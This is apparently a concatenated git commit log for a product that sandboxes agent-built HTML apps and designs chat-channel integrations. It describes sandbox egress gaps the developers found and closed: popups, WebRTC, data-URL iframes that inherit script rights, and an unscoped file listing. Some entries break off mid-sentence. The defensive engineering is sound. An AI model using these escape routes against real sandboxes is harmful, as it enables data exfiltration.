The sandbox and CSP lines were stale after dropping allow-popups, and the

Adds a table of every egress channel and what stops it, and states the two
things that are easy to get wrong: CSP fetch directives do not govern
navigation (so no CSP value blocks a popup, only the sandbox attribute does),
and form-action does not inherit from default-src, so it has to be named.

Also records the consequence for later phases: relaxing the CSP to let apps
load a library from a CDN is an egress decision, not a convenience one. The
library shelf exists so that never has to happen.

fix(entities): close WebRTC, the egress channel the CSP does not reach

`default-src 'none'` governs fetch, XHR, WebSocket, beacons and every resource
load. It does not govern ICE, because ICE is not a fetch. Measured against this
exact sandbox and policy: a peer connection gathered a `srflx` candidate — a
completed round trip to a public STUN server — and UDP reached a host and port
of the app's choosing. Every HTTP-shaped channel in the same probe was blocked;
this one was wide open.

`webrtc 'block'` in a <meta> policy had no effect, so the fix is the stub, which
runs before any app script: the peer-connection constructors are removed before
the app can hold a reference. The usual recovery — read a clean copy off a
nested about:blank frame — fails here because the sandbox has no
`allow-same-origin`, so the app cannot reach into its own child frames either.
Verified in the real assembled document: constructor undefined, construction
throws, fresh realm throws SecurityError, no candidate gathered.

Read this as what it is: a blocklist entry. It was found by thinking of one more
exit, which is the same move that missed popups. Enumerating exits against a
browser does not terminate. The server-side prefix check is what makes the exit
list stop being load-bearing, and it is the next commit rather than a someday.

feat(api): folder-scoped tokens so the server enforces the app's folder

"The app may only touch its own folder" was enforced in exactly one place: the
browser tab. The server saw a signed-in person asking for a file in a drive they
can read — which is what it is — and said yes. One bug in the page's path
handling and an app reached the whole mount, and there was a real one: markup
references skipped the check entirely.

Everything closed that way so far has been a blocklist entry. Popups, then
WebRTC, each found by thinking of one more exit. Enumerating exits against a
browser does not terminate. This does not need enumerating: an app that cannot
obtain bytes outside its folder makes the exit list stop being load-bearing.

`POST /mounts/{id}/apps/scope` issues a token naming project, mount, folder and
level. The page attaches it as `X-Agenta-App-Scope` on every bridge call, and
the file routes refuse a path outside the prefix or a write under a read token.

It NARROWS and never widens. The caller still authenticates as themselves and
still passes the project permission check; the token only takes access away. So
a stolen token grants nothing its holder lacked, minting read-write requires
EDIT_MOUNTS exactly as the write does, and a request without one is an ordinary
drive call — which is how the Files pane is unaffected.

Stateless: an HMAC over the claims with the deployment's AGENTA_CRYPT_KEY. No
table, no cleanup, no lookup on the hot path. Thirty-minute TTL, because a
folder grant lives as long as the tab.

A test found one real defect while writing it: `"   ".strip("/")` is truthy, so
a whitespace-only prefix would have been signed. Now refused.

Backend only. The frontend still sends no token, so nothing changes yet — the
wiring is the next commit.

feat(entities): send the folder-scoped token on every bridge call

The server half landed in the previous commit and nothing used it. The host now
mints a token for its mount, folder and grant level, and all five fs operations
carry it as `X-Agenta-App-Scope` — the four Fern calls through requestOptions,
the axios write beside its If-Match.

The point is that this file stops being the only thing standing between an app
and the rest of the drive. It still resolves the path and checks the grant; the
difference is that a mistake in either is now refused by the API instead of
served. That is what the popup and WebRTC fixes could not buy: those closed two
exits, and the exit list never finishes.

A failure to mint returns null and the app runs unscoped. The token only ever
narrows, so its absence is exactly the behaviour that shipped before it existed
— refusing to open an app because a token endpoint is missing would trade a
defence-in-depth layer for an outage.

One mint per mount+dir+level, shared across a burst of parallel boot reads, and
re-minted a minute before expiry so a long-open app never lands on a lapsed
token.

The mint call uses axios because the endpoint postdates the last Fern
generation. It belongs in the same regeneration that gives `writeMountFile` a
body; both are why this module touches axios at all, and both close together.

docs(agent-apps): the folder is a server boundary, and why the deferral was wrong

The recorded decision was "no server-side folder check in v1, by design; a
scoped token if apps ever become shareable". The reasoning behind it was that an
escape had no payoff because the app had no way to get data out.

That was false twice. Popups went out through a channel no CSP directive
governs; WebRTC went out through another. Both were found by thinking of one
more exit, which is not a method that finishes — the surface grows every browser
release, and a blocklist is only as good as the last person who looked.

So the deferral is withdrawn rather than left standing as the decision, and the
egress table now says what it is: a record of what is closed, never a proof that
nothing is open.

The table gains the WebRTC row and the measurement behind it. The section gains
the reason the prefix check exists: an app that cannot obtain bytes outside its
folder makes the exit list stop being load-bearing. The table still matters,
because an app can always leak the folder it was granted — the difference is
that the damage is now bounded by what the person chose to show it, rather than
by whether the page got every path right.

refactor(drive): the app bridge goes through the generated client, write included

Mahmoud's question 3 asked which mounts client methods should back the bridge,
and his own answer ruled out the workaround we shipped: "Existing binary
download code uses Axios because Fern JSON parsing cannot preserve bytes; that
exception does not automatically apply to new text file methods."

The reason it happened anyway was real. `write_mount_file` reads its body with
`await request.body()`, which FastAPI cannot see, so the spec described a PUT
with no body and the generated method duly sent none — calling it would have
written an empty file. The scope-token endpoint then added a second axios call
for the same reason.

Both are closed here. The route declares its body for OpenAPI only, through
`openapi_extra`: the runtime read is untouched, so behaviour is byte-identical
and the 255 mount tests are unchanged. With the body in the spec, Fern emits a
method that carries it, and `write` and the token mint both move onto the
generated client. No hand-built URLs are left in the bridge.

Two things a reader should know. Fern drops declared header params from an
endpoint that takes a binary body, so `If-Match` travels in
`requestOptions.headers` on write while staying a typed field on delete. And
the regeneration is deliberately narrowed to the mounts resource, per the build
plan: a full regen also pulls in unrelated drift, and `GatewayPermissions`
turning optional breaks the DrillIn schema controls. That client is stale and
deserves its own regeneration with the consumers fixed — not a ride-along here.

fix(drive): give the HTML preview a policy, not a longer strip list

Preview strips every agent script and then renders with allow-popups, and
the first half was being read as the reason the second half was safe.

It is not. The stripper clears iframe[srcdoc] but never touched
iframe[src="data:text/html,..."]. That nested context inherits
allow-scripts from the preview sandbox, so its script runs even though the
outer document has none left, and Preview injected no CSP at all, so it
could fetch anywhere. Verified against the real flags: the request arrived
at a listening server with its query string intact. object[data] and embed
execute the same way, so adding iframe[src] to the strip list would have
moved the vector rather than closed it.

PREVIEW_CSP denies the capability instead of chasing the elements:
frame-src and object-src close the nested contexts, and default-src 'none'
covers connect-src so a context that somehow runs still has no way out. Re-run
of the same probe with the policy in place: nothing ran, nothing arrived.

Wider than RUN_CSP in one place on purpose. inlineAssets only folds in
same-mount assets and leaves external URLs alone, so drive HTML that links a
remote stylesheet, image or font renders today and keeps rendering.

The move-lock test now compares through withoutCsp, so it still guards the
inlining byte-for-byte while the policy is asserted on its own.

server boundary again, not a client guardrail, which is where the design
landed after two more egress exits turned up behind the first; the review
finding that argued the other way is marked superseded in place rather
than deleted, and the three-boundary diagram no longer claims the server
cannot stop a read of a sibling file.

Docs only. No code on this branch.

docs(agent-apps): fold the server-side folder boundary into the build plan

Four review findings from CodeRabbit on #6983.

The build plan was the important one. It still described folder confinement
as client-only and still told a lane to write through axios.put, so anyone
building from it would have implemented the design the egress findings
replaced. Lane A gains a scopeToken.ts step (mint, cache, refresh margin,
in-flight collapsing) and its fsClient step now writes through Fern
writeMountFile and maps a scope refusal; Lane B gains scope_token.py, its
tests, and the POST apps/scope route with the X-Agenta-App-Scope header.
The contract line says plainly that the token narrows and never widens,
which is why the Files pane is untouched by it.

The index still called these files untracked in another worktree, which
this PR is the refutation of.

The canvas accessibility bullet described the DOM mirror as something a
screen reader reads. It is also the only way to operate the board without a
pointer, and it had no control for toggling done or making a connector.
Both are specified now, going through the same mutation and the same
If-Match write as the pointer path rather than a second one, with an
aria-live region because a canvas gives a keyboard user no feedback.

An h4 under an h2 becomes the h3 it should have been.

fix(apps): say which record wins when two sessions hold the same slug

The registry layout is already per session, so concurrent sessions cannot
overwrite each other. What was missing is the read side: rule 3 told the
agent to merge every session's file by slug without saying what merge means
when two of them claim the same slug, which is the one case that can happen.

Later updated_at wins, this session breaks a tie, and the merge stays a read
operation. The last part matters more than the tiebreak: without it an agent
could decide to tidy up by rewriting another session's file, which rule 2
forbids and which would lose that session's record.

Regenerated SKILL.md from the section, per assembly.py.

docs(agent-apps): make latest-wins a total order, and fix the registry path

Two review findings from CodeRabbit on #6983.

The merge-by-id format said latest wins per object without defining the
comparison, so two writers could hold one object at the same stamp and no
reader could choose. updated_at is now RFC 3339 UTC with millisecond
precision and each object carries by; on an exact tie the app value wins,
because a tie means the person moved that object and is watching it while
the agent wrote blind. The paragraph also says what the rule is not: it
settles which value a reader keeps, not the real-time order of two edits on
two clocks, and If-Match is still what stops a whole-file clobber.

C7 and the layout diagram still showed a single registry.json, which
contradicts the per-session .apps/registry/<session-id>.json the skill
actually implements. The doc was the wrong one.

fix(apps): drop the one-writer claim the board starter already contradicts

The folder section told the agent that each file has one writer and the app
owns its data while open. board@1's own SKILL.md says the opposite in the
same breath: 'the app saves after every move; the agent may edit board.json
too, the app re-reads on change.' The whole If-Match and conflict path
exists because two writers share that file.

So the rule was never one writer. It is one primary writer plus
reconciliation, and an agent reading the old sentence would either avoid a
write it is supposed to make or make it without reading first, which is the
unconditional write that loses data.

Says what the agent needs instead: it may write data, and it reads the file
first because its writes carry no If-Match. Kept terse because the
instruction body is budgeted; 4584 of 4608 bytes after this.

docs(agent-apps): one primary writer, not one writer

CodeRabbit flagged the canvas page for asserting one writer per file and
then requiring the app and agent to merge concurrent writes. Checking the
code made it worse than a canvas problem: board@1, the starter that ships
today, says the agent may edit board.json while the app has it open. The
rule is contradicted by phase 1, not just by phase 3.

Two sentences said it outright and are replaced. creation.html's version
contradicted itself inside one bullet: one writer per file, then how to
handle the conflict and why the agent must read before writing.

The design was always one primary writer plus reconciliation: the app owns
its data while open, the agent may write too, and If-Match plus re-read is
what makes that safe. Canvas needs merge-by-id on top because both sides
change geometry.

Left alone: the agent-level registry and notes, where one writer per file
is true and load-bearing, and six-apps' review queue, where the two files
genuinely do not overlap.

docs(agent-apps): the conditional put shipped; only delete is emulated

CodeRabbit objected to stat-compare-put as a conditional-write fallback: a
check followed by a write is not conditional, and it answers 200 on the race
it cannot see. Right, and the reason the objection lands in the docs rather
than the code is that the fallback was never built.

put_object sends a real If-Match to the store and the service raises on a
failed precondition, traced from the router through write_file. Three pages
still described the fallback as the plan and one still listed the spike as
an open question; all four now say what shipped, and say not to add the
fallback for writes.

DELETE is the one place the compromise survives, because conditional
DeleteObject is not portable across S3-compatible stores. storage.py states
the race at the function; the docs advertised conditional writes without it,
so they say it now.

docs(agent-apps): state the delete race, and stop describing the axios write

Two stale claims in the contract that reviewers would take at face value.

DELETE was listed as honouring If-Match with no qualification. It does, but
the store emulates it as stat-compare-delete because conditional
DeleteObject is not portable, so a write landing in the window is not
caught. PUT has no such gap. storage.py already says this at the function;
the contract is where someone reading the API would look, and it did not.

The transport note still said the generated writeMountFile sends no body and
the host writes through axios. That stopped being true in 2d16e167e4: the
endpoint declares its raw body through openapi_extra and every method now
goes through the generated client.

fix(apps): a scope token must narrow a listing, never widen it

Review on #6972.

A pathless listing skipped the prefix check. `enforce` only compared a path when
one was given, and the list route passed the caller's `None` straight through to
`list_files`, which walks the whole mount. So a page holding a folder-scoped
token could read every file on the drive by leaving `path` off — the one thing a
scope token must never permit.

`enforce` now returns the path the request must use, so narrowing cannot be
forgotten at a call site: a scoped caller that names no path gets its own folder,
and an unscoped one keeps whatever it asked for.

Also from the same review:

- The board starter treated a column id as an identity everywhere except where it
  read one. Duplicate ids in the config rendered a second column that always drew
  empty, and duplicates in the stored board collapsed in a Map that kept only the
  last, dropping the other's cards on the next load. Config now keeps one column
  per id, and a stored duplicate folds its cards in rather than losing them.
- The Run view is keyed by its entry file. It held the page, the back stack and
  the iframe from whichever file it opened with, so swapping the entry while Run
  stayed selected re-rendered the previous file under the new app's name.
- The session registry example was not valid JSON. Agents copy these literally,
  so it names its keys instead of showing a shape that cannot be parsed.
- Import order in `fsClient.ts`, and `ruff format` on the mounts router: both
  were failing CI.

fix(apps): let a read-only board take remote changes

Review on #6972. `dirty` was standing in for two different things: "a save is
coming" on a writable board, and "scratch edits that can never be written" on a
read-only one. The reload guards wanted the first meaning and got the second, so
once a read-only viewer touched a card the board never picked up a remote change
again — `scheduleSave` set `dirty` and returned without ever scheduling the save
that clears it, and every `pendingReload` check required `!dirty`.

One named predicate now asks the real question: local edits hold a reload back
only while something will actually write them. The viewer is already told their
changes are not saved, so a remote change wins.

fix(apps): say which 403 it was, and stop a blind first write

Two seams the server had already built and the bridge never used, both raised by
the review on #6983 as documentation problems.

The server refuses a path outside the folder and a write above the level with
the same 403, and only `detail.code` separates them. Every 403 was mapped to
`read_only`, so the SERVER-side folder boundary — the one that matters, the one
a page cannot talk its way past — reported "read-only access". It also disagreed
with the host's own path guard, which calls the same condition `scope`.

The write precondition had the matching gap. `If-None-Match: *` is implemented
in the API and named in the contract, but `FsWriteOptions` had no way to send
it, so a write with no cached etag went out unconditional: two Run sessions
could both create the same path and the later one overwrote the earlier, with
no 412. A first write is now create-only, and a path that already exists comes
back as `conflict` for the app to read and merge. A held etag still wins — it
is the stronger statement, and the two together would contradict each other.

test(apps): pin why the Run view is keyed by its entry file

The key was added from the review without a test, and a browser check of the
plain case proved nothing: swapping the entry re-renders either way, because the
content prop changes with it.

The defect needs the view to be somewhere else first. An app that navigated to a
sub-page holds `currentPath` there, and swapping the entry underneath it left
that pointing at the previous app's page — so the reader picked a different app
and kept reading the old one's sub-page under the new app's name.

This drives the host's `nav` callback to move the view off the entry, then swaps
the entry, and asserts the old app's sub-page is not fetched again. It fails with
the key removed.

Every Grok run died before sampling started: xAI refused the whole tool set with
`invalid_client_tool_schema` — "tool parameter root must be an object type".

The root already declares `type: object`; the sibling `oneOf` that makes

fix(runner): name the offending key when Pi rejects an unexpected property

Pi validates tool arguments against the advertised schema before it dispatches
and formats each failure as `  - <path>: <message>`. For a closed object that
message is typebox's "must not have additional properties", which names the
object and never the extra key, so a model reading
"workflow_revision: must not have additional properties" has to guess which of
the properties it sent is the unexpected one. Live QA watched exactly that.

The key was never missing, only unused: typebox reports it in
`params.additionalProperties`. Pi already special-cases the `required` keyword
to name the missing property from `params.requiredProperties`; this gives
`additionalProperties` the same treatment.

Message formatting only. No validation logic changes, so the same calls fail and
the same calls pass. Verified through Pi's own validateToolCall against the
patched bundle: one extra key names it, several name all of them, a missing
required field is unchanged, and a valid call is still accepted.

Applied in the runner image build as a sibling of patch-codex-acp-approvals.ts.
It exits non-zero when Pi's formatter no longer matches, so a pi-ai bump breaks
the build rather than silently restoring the unactionable message. The injected
function text is derived from the exported formatter, so the code that runs
inside Pi and the code the tests exercise cannot drift.

Scope, recorded in the module header: this reaches the copy of Pi in the runner
image, so a Daytona run executing Pi from the sandbox image still words the
error the old way.

docs(design): channels v2 design set and workstreams

docs(design): external_key is a uuid5 over declared key fields

Closes the last C0 gap. The design stated "one function composes it, no
exceptions" but never said how, and the function name in circulation was
invented rather than specified.

external_key becomes a UUID — uuid5 over the adapter's declared key fields
for that grain — rather than a joined string. A join needs an escaping rule
for platforms whose ids carry the delimiter (Teams), and an untested
escaping rule is a latent collision that merges two conversations.

Adapters declare identity.key_fields per grain and never compose; core
composes. The field set is the fragile part either way: change it and every
row re-keys, and a hash makes that invisible rather than merely quiet. A
declaration is checkable, so WP2's contract suite holds adapters to it —
including the distinctness case, since a too-small field set silently
merges threads.

Renames the wire field data.space.external_key to data.space.locator: a
bridge sends its platform's fields, never a key, and the old name would
have invited a raw string into a UUID column.

docs(design): platform declarations for Slack, Telegram, Discord

Researched against the platforms' own docs and written into channels.md,
each with the values that are uncertain or tier-dependent called out rather
than rounded, and every non-obvious number cited.

The research broke the schema in four places, all of them one scalar being
asked to hold two real values, so the schema changed:

- files splits by direction. Telegram is 50 MB up / 20 MB down and Discord's
  bot cap is not its user cap, so one max_bytes was wrong for two of three
  first-class channels.
- Limits are now stated as "what the adapter renders against", not the
  largest the platform documents. Slack publishes 4000 as guidance while
  Block Kit enforces 3000; Telegram is 4096 plain but 1024 for a caption;
  Discord 2000 plain but 4096 in an embed. Under-declaring degrades,
  over-declaring fails at send.
- identity.scope can depend on the install, not just the platform: Slack
  under Enterprise Grid issues one global user id. Declare the narrower
  workspace value and let the wider install be a superset — the reverse
  cannot distinguish two people sharing an id across workspaces.
- buttons.max: Slack has two live APIs with two real caps (legacy 5,
  Block Kit 25). Declare the one the adapter builds against.

Grouping pass over the declaration, same theme as the last commit:
rendering.controls.{update,ephemeral}, addressing.commands.{native,
in_conversation}, conversation.default, identity.keys.

The line is RUNTIME dependency, not code dependency. Importing a module, a

docs(channels): decide how a connection reaches verification

The secret lives in the connection and the connection is found by an id that
verification returns, which looked circular. It is not: both arms already carry
an unverified installation hint in the body, and both verifiers take the secret
as a parameter. Parse the hint, look the connection up, verify with its secret.

The hint selects which secret to check against and grants nothing, so the
signature remains the only thing that decides. A wrong hint finds no connection
or one whose secret fails, and both refuse the same way.

Capabilities become per-connection as a consequence, which is the second symptom
the multi-bridge failure showed.

fix(channels): verify a signature against the connection it belongs to

The composition root registers one shared adapter holding no connection, so
verification raised before reading a header and no correctly-signed request
could pass -- for Slack in the deployed app, not only for bridges. The endpoint
answered 401 exactly as it would for a genuine bad signature, which is why it
went unnoticed.

The secret lives on the connection and the connection is found by an id
verification returns, which looked circular. It is not: the body already carries
an unverified installation claim, so the ingress resolves a candidate from that
claim and verifies against its secret. The claim only chooses which secret to
check; the verified id must then match the connection, and an unresolvable claim
refuses exactly as a bad signature does so the route cannot be used to discover
which installations exist.

Two seam fixtures built the adapter WITH a connection while production builds it

The port now requires the method, so an adapter that does not participate fails

The same mechanism serves every channel: read an unverified installation claim

docs(channels): no channel declares its credentials or has an onboarding flow

The earlier finding reads as a missing route for four keys. It is wider: six
credential key names across two adapters, none documented, one pair admittedly
invented; capability declarations say what a channel can do and nothing about
what it must be given; and the Slack app manifest builder that exists has no
callers at all.

Locates the real difference between the transports. The ingress mechanism is
uniform and does not branch on channel. Provisioning is what differs: a
self-hosted bridge operator can be handed a secret and a URL, while a
first-party channel's credential comes from the platform through a flow only
that platform defines -- an app manifest and OAuth, a token from a chat with a
bot, an application with a gateway intent. The schema generalises; the ceremony
does not.

docs(channels): record an independently-built channels stack as prior art

A comparable SDK, a reference agent on top of it, and the agent-facing event
protocol they share all shipped in the last six weeks. Their platform adapter
and ours are close to the same object, down to two rules we learned the hard
way: the renderer must never throw on a node the surface cannot express, and an
interaction must be addressed by an id that survives the round trip.

They are ahead on the gap we just named. The operator's service holds no
platform credentials at all -- an api key selects a project and a name selects a
channel, while a separate plane owns the app manifest, the install and the
secrets. Their manifest is generated from the declared handlers, which is what
our uncalled manifest builder was written for.

They also shipped two of our own defects. Commands and modals compiled, started,
reported online and never fired because the generated manifest declared neither.
And their channel names are claim-based, so two runtimes sharing a name race per
delivery and the loser silently receives nothing -- an unscoped name-keyed
lookup with a silent loser, mitigated by prose.

docs(channels): design rendering fallbacks and channel provisioning

Rendering: the target surfaces are unequal, and the poorest plausible one is
text with no interactivity at all. So a node that cannot be rendered degrades to
text rather than being dropped -- dropping a chart loses decoration, dropping a
choice stalls the conversation. The numbered fallback that exists for too many
buttons generalises to every surface without them.

That forces the other half, which is missing today: a reply of "1" must resolve
to the same pending action a click resolves to. So a pending choice is state on
the thread indexed by a short token, not an opaque value carried in a message,
because a text-only surface carries nothing. Forms follow as a sequence of
questions rather than a modal, since only the richest surface has modals.

Provisioning: one declared credential schema shared by every channel, and a
separate flow per platform, because how a credential is obtained does not
generalise. The Slack manifest is generated from the configuration rather than
from code, and we store the hash of what is installed so drift is visible -- a
command enabled in our UI and missing from their app is otherwise silent.

Four packages, the schema blocking the rest. Telegram comes second rather than
last: with only Slack configured, a shared schema is indistinguishable from
Slack's own fields.

docs(channels): two app models, and keep secrets out of the event log

Research into a governance-first automation platform answered the multi-tenancy
question we had left open. They offer both an own-brand app and a customer-owned
app, and declare the difference rather than choosing: the shared app cannot do
commands, modals or event subscriptions, and self-hosted tenants can only use
their own.

That limit is structural, not a product choice -- commands and event
subscriptions belong to the app, not the installation, and an app has one
manifest. So a shared app would force one command set on every customer. It is
the same fact that makes a generated manifest necessary, seen from the other
side.

Also adds a type per credential field, since a token that expires needs a
refresh path a static secret does not, and a redaction rule: our inbox and
outbox persist a payload per event, so a platform that echoes a token back would
put it in our log. Their documented mitigation is asking the user to trim their
own output, which is worth avoiding by redacting on ingest instead.

docs(channels): design the capability axes and identity linking; keep the bridge

Capabilities gets three additions as one change, because they share a type and a
call site: what a channel needs, what to render instead, and both per connection
rather than per channel. The last is already real -- two app models differ in
what they can do, and a workspace can decline a scope at install.

Identity: the read path exists and nothing writes a link, so every platform user
is permanently unlinked and only the unlinked branch is ever taken. A
short-lived single-use token posted in thread, redeemed against the user's own
session. Our own surface skips this entirely, which is a reason not to read it as
proof the flow works.

The bridge stays. Measured rather than argued: the ingress branches on channel
zero times, so the over-wire path is the in-process path over HTTP, and cutting
it recovers almost nothing. It is also the only consumer of the adapter contract
that is not us, which our own contract already said was the point.

Records that the connection key identifies the workspace where it should
identify the bot, and that the ingress resolve is the single query that cannot
be project-scoped because its job is to establish the project.

The list was prose sections while the statuses lived in conversation, so the
